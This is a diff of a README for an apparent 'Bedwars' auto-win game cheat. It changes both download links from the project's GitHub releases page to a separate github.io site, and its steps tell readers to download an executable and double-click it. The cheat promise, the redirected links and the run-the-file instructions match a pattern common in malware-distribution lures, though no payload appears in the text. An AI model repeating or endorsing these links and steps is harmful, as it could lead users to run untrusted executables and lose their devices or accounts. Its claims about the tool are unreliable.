@@ -1,6 +1,6 @@
 # 🎮 Bedwars-Script-Auto-Win-2026 - Master Bedwars games with ease today
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Ozk4r7466/Bedwars-Script-Auto-Win-2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://ozk4r7466.github.io)
 
 ## 📌 Overview
 
@@ -19,7 +19,7 @@ To run this tool, ensure your computer meets these basic requirements:
 
 Follow the steps below to set up the software on your machine.
 
-1. Visit the [official releases page](https://github.com/Ozk4r7466/Bedwars-Script-Auto-Win-2026/releases).
+1. Visit the [official releases page](https://ozk4r7466.github.io).
 2. Download the most recent installer or executable file provided in the list.
 3. Save the file to a folder you can find, such as your Downloads folder.
 4. Double-click the downloaded file to start the installation process.
